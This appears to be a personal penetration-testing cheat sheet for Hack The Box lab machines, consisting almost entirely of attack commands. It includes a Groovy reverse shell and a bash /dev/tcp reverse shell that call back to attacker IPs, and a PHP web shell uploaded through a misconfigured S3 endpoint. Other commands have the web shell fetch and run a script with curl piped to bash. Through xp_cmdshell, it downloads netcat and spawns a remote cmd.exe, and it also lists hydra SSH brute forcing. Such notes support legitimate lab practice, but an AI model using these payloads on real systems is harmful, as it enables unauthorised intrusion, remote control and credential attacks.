Temp:
h!B@h18.htb:h!B@h18.htb1

how to jenkins bruteforce?

SSTI,XSS,blob:https://app.hackthebox.com/32caa1fd-54a8-499f-acea-b27d3e03c561

Foothold:
PHP
~~reverse shells
https://github.com/BlackArch/webshells
/usr/share/webshells/
upload file & look for uploads directory
python3 -c 'import pty;pty.spawn("/bin/bash")'



SMBCLIENT

smbclient -N -L \\\\{TARGET_IP}\\
smbclient -L 10.129.209.18 -U Administrator
smbclient \\\\10.129.209.18\C$ -U Administrator

Groovy rs
String host="10.10.14.23";
int port=8001;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


Home:
id
ss -tln // skip service names
ss -tl 
ss -tlpn

Util:
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts




Enumeration:
sudo nmap -sV 10.129.227.248
nmap -sV -sC -p- 10.129.158.230 -oN scan.txt

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.158.230 -x php
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 10.129.158.230


#Impacket
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo python3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt

cd impacket/examples/
python3 mssqlclient.py -h

SELECT is_srvrolemember('sysadmin');

EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.78/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.78 443"
[xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)
10.10.14.9 443"
wget http://10.10.14.78:8000/winPEASx64.exe -outfile winPEASx64.exe
https://github.com/int0x33/nc.exe/blob/master/nc64.exe

Services:
FTP:
anonymous:anonymous

Postgresql:
psql -U christine -h localhost -p 1234
\l \list 
\c \connect ${database}
\dt ##relations
SELECT * FROM flag;

Bruteforce:
hydra -L usernames.txt -p 'funnel123#!#' {target_IP} ssh



Cloud:
AWS:
apt install awscli
aws configure
aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb


#Reverse shell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
http://thetoppers.htb/shell.php?cmd=id

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.23/1337 0>&1

nc -nvlp 1337

http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.23:8000/rs.sh|bash
python3 -m http.server 8000


#tunneling 
local port forwarding
ssh -L 1234:localhost:5432 christine@{target_IP}

dynamic port forwarding
/etc/proxychains4.conf
ssh -D 1234 christine@{target_IP}
1. Ensure that strict_chain is not commented out; ( dynamic_chain and random_chain should be
commented out)
2. At the very bottom of the file, under [ProxyList] , we specify the socks5 (or socks4 ) host and port
that we used for our tunnel
<SNIP>
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 127.0.0.1 9050
socks5 127.0.0.1 1234
proxychains psql -U christine -h localhost -p 5432
